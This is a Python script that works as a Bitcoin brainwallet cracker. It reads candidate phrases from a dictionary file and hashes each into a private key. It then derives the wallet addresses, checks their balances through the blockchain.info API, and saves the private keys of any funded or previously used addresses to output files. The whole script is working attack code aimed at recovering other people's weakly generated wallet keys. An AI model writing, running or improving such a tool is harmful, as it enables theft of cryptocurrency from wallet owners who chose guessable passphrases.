import threading
import os
import time
import hashlib
import requests
import json
from bit import Key
from bit.format import bytes_to_wif
import traceback

def getAddress(phrases):
    keyList = []
    addrList = []
    addrStr1 = ""
    addrStr2 = ""
    try:
        for phrase in phrases:
            sha256hex = hashlib.sha256(phrase.encode("utf-8")).hexdigest()
            key1 = Key.from_hex(sha256hex)
            wif = bytes_to_wif(key1.to_bytes(), compressed=False)
            key2 = Key(wif)
            keyList.append(sha256hex)
            addrList.append(key2.address)
            addrList.append(key1.address)
            if len(addrStr1): addrStr1 = addrStr1 + "|"
            addrStr1 = addrStr1 + key2.address
            if len(addrStr2): addrStr2 = addrStr2 + "|"
            addrStr2 = addrStr2 + key1.address
    except:
        pass
    return [keyList, addrList, addrStr1, addrStr2]

def getBalances(addrStr):
    balances = "security"
    while True:
        if "security" not in balances: break
        secAddr = balances.split("effects address ")
        if len(secAddr) >= 2:
            secAddr = secAddr[1].split(".")[0]
            addrStr = addrStr.replace(secAddr + "|", "")
            addrStr = addrStr.replace("|" + secAddr, "")
        try:
            r = requests.get(url='http://blockchain.info/multiaddr?active=%s' % addrStr, timeout=5)
            balances = r.text
        except:
            return
    try:
        balances = json.loads(balances)
        balances = balances['addresses']
    except:
        print (balances)
    return balances

'''
def getBalances(addrStr):
    balances = "security"
    try:
        r = requests.get(url='http://blockchain.info/multiaddr?active=%s' % addrStr, timeout=5)
        balances = r.text
    except:
        return
    if "security" in balances: return
    balances = json.loads(balances)
    balances = balances['addresses']
    return balances
'''

getCount = 0
fp_dict = open("dict.txt", "r")
fp_found = open("found.txt", "w+")
fp_fund = open("fund.txt", "w+")

def getWallet():
    global getCount
    while True:
        phrases = []
        try:
            for i in range(128):
                readStr = fp_dict.readline().replace("\r","").replace("\n","")
                if not len(readStr): break
                phrases.append(readStr)
        except:
            pass
        if len(phrases) <= 0: break
        addressRet = getAddress(phrases)

        try:
            balancesRet = getBalances(addressRet[2])
            for balance in balancesRet:
                getCount = getCount + 1
                if balance['final_balance'] <= 0 and balance['total_sent'] <= 0: continue
                key = ""
                isCompress = 0
                for i in range(0, len(addressRet[1])):
                    if balance['address'] == addressRet[1][i]:
                        key = addressRet[0][int(i/2)]
                        if i % 2 == 1: isCompress = 1
                        break
                if key == "": continue
                fp_found.write(str(isCompress) + " " + str(balance['final_balance']) + " " + str(balance['total_sent']) + " " + key + " " + balance['address'] + "\n")
                if balance['final_balance'] > 0:
                    fp_fund.write(str(isCompress) + " " + str(balance['final_balance']) + " " + str(balance['total_sent']) + " " + key + " " + balance['address'] + "\n")
                #print (isCompress, balance['final_balance'], balance['total_sent'], key, balance['address'])

            balancesRet = getBalances(addressRet[3])
            for balance in balancesRet:
                getCount = getCount + 1
                if balance['final_balance'] <= 0 and balance['total_sent'] <= 0: continue
                key = ""
                isCompress = 1
                for i in range(0, len(addressRet[1])):
                    if balance['address'] == addressRet[1][i]:
                        key = addressRet[0][int(i/2)]
                        if i % 2 == 1: isCompress = 1
                        break
                if key == "": continue
                fp_found.write(str(isCompress) + " " + str(balance['final_balance']) + " " + str(balance['total_sent']) + " " + key + " " + balance['address'] + "\n")
                if balance['final_balance'] > 0:
                    fp_fund.write(str(isCompress) + " " + str(balance['final_balance']) + " " + str(balance['total_sent']) + " " + key + " " + balance['address'] + "\n")
                #print (isCompress, balance['final_balance'], balance['total_sent'], key, balance['address'])
            fp_found.flush()
            fp_fund.flush()
        except:
            traceback.print_exc()
            continue
        clearScreen()
        print (getCount)

def clearScreen():
    os.system('clear')

def main():
    threads = []
    for i in range(1):
        threads.append(threading.Thread(target=getWallet,args=()))
    for t in threads:
        time.sleep(1.0)
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
